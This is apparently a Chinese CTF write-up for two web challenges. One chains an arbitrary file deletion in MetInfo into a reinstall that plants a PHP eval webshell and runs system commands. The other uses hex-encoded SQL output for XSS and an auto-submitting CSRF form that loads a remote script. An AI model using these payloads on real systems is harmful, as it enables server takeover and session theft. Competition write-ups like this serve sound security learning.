---
title: 巅峰极客ctf
date: 2018-07-23 20:33:53
tags: ctf
---

## pentest

1. 御剑扫描

2. 经过目录扫描，发现`file/file.php`

   根据网页最后提示:

   ```
   DELETE FILE
   Sorry,no filename!
   ```

   可以猜测存在任意文件删除漏洞。

3. 首先我们删除`install.lock`

   ```
   http://c2a2868220484acaae0b962988dbecbbd872061666de4bc6.game.ichunqiu.com/file/file.php?file=...//config/install.lock
   ```

4. 重装metinfo，重装的时候数据库名填写 

   ```
   met#*/@eval($_GET[1]);/*
   ```

   数据库密码为`root`

5. 执行shell即可

   ```
   http://c2a2868220484acaae0b962988dbecbbd872061666de4bc6.game.ichunqiu.com/config/config_db.php?1=system(%27ls%27);
   ```

## mysqlonline

首先通过mysql查询，经过hex编码在输出，可以造成xss。

```
select 0x3c7363726970743e616c6572742831293c2f7363726970743e
```

结合CSRF即可打后台:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://106.75.35.230:9001/runsql.php " method="POST">
      <input type="hidden" name="sql" value="select 0x30783c736372697074207372633d687474703a2f2f69702f7873732f312e6a733e3c2f7363726970743e" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

